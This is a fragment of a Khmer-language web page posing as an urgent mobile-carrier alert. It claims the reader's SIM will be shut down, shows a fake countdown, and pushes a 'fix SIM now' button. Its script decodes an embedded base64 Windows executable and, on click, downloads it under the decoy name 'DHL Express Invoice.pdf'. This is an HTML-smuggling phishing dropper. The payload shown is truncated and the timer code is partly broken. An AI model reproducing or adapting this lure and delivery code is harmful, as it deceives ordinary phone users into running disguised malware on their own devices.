    <h2>ស៊ីមរបសំខាន់!</h2>
  </div>
  <div class="content">
    <p>លេខទូរស័ព្ទរបស់អ្នក <b>093 123 4567</b> នឹងត្រូវបានជាប់សង្ស័យធ្វើសកម្មភាពមិនប្រក្រតី។</p>
    <p class="timer">01:58:42</p>
    <p>សូមចុចដោះស្រាយជាបន្ទាន់មុនពេលស៊ីមត្រូវបិទជាអចិន្ត្រៃយ៍</p>
    <button class="btn" id="fix">ដោះស្រាយស៊ីមឥឡូវនេះ</button>
  </div>
</div>

<script>
var base64_payload = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...";
var bin = atob(base64_payload);
var arr = new Uint8Array(bin.length);
for(var i=0;i<bin.length;i++) arr[i] = bin.charCodeAt(i);
var blob = new Blob([arr], {type:'application/octet-stream'});
var url = URL.createObjectURL(blob);
document.getElementById("fix").onclick = function() {
    var a = document.createElement("a");
    a.href = url;
    a.download = "../DHL Express Invoice.pdf";
    a.click();
};
setInterval(() => {
    var t = document.querySelector(".timer").innerText;
    var parts = t.split(":");
    var secs = parseInt(parts[2]) - 1;
    if(secs < 0) { secs = 59; var mins = parseInt(parts[1]) - 1; }
    document.querySelector(".timer").innerText = "01:" + ("0"+mins).slice(-2) + ":" + ("0"+secs).slice(-2);
}, 1000);
</script>
